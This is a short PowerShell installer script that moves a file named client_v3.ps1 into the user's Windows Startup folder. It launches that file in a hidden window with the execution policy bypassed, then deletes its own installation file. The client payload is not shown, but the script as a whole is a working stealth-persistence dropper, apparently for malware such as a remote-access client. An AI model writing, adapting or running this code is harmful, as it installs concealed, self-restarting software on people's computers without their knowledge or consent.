# Copy the client.ps1 to the startup directory
# C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
$currentLocation = Get-Location
$sourcePath = "$currentLocation/client_v3.ps1"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\client_v3.ps1"
Move-Item -Path $sourcePath -Destination $startupPath -Force
# Copy-Item -Path $sourcePath -Destination $startupPath -Force
# Change directory to the startup directory
Set-Location "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
# Run the client.ps1 script at startup directory
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$startupPath`"" -WindowStyle Hidden
Set-Location $currentLocation
# delete this installation script
Remove-Item -Path "$currentLocation/installation.ps1" -Force
#exit from this ps1 file
exit 0
